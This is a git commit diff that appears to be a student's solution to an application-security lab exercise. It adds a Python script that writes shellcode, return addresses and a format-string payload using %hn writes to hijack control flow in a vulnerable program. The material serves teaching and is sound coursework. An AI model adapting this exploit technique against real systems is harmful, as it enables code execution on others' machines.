8871fd9938c22dee63fad8fb22e6d6a96b61ee51
Rio Martinez <rioam2@illinois.edu>
2020-09-12 15:21:47 -0500

    1.2.9?

--- AppSec/1.2.9.py
+++ AppSec/1.2.9.py
@@ -5,3 +5,7 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+padding = b"\x90"
+ADDR1 = b"\x6c\xb3\xfe\xff"
+ADDR2 = b"\x6e\xb3\xfe\xff"
+sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%19$hn%21648x%20$hn")
